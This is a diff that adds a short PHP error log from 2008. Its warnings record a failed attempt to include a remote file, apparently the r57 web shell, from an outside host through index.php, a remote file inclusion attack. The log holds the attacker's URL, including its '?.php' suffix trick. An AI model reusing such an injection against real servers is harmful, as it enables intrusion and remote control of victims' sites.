@@ -1,0 +1,3 @@
+[09-Jul-2008 18:24:04] PHP Warning:  include() [<a href='function.include'>function.include</a>]: URL file-access is disabled in the server configuration in /home2/vmarquez/public_html/bpa/index.php on line 86
+[09-Jul-2008 18:24:04] PHP Warning:  include(http://www.infotranzit.ro/~nos/r57.txt?.php) [<a href='function.include'>function.include</a>]: failed to open stream: no suitable wrapper could be found in /home2/vmarquez/public_html/bpa/index.php on line 86
+[09-Jul-2008 18:24:04] PHP Warning:  include() [<a href='function.include'>function.include</a>]: Failed opening 'http://www.infotranzit.ro/~nos/r57.txt?.php' for inclusion (include_path='.:/usr/lib/php:/usr/local/lib/php') in /home2/vmarquez/public_html/bpa/index.php on line 86
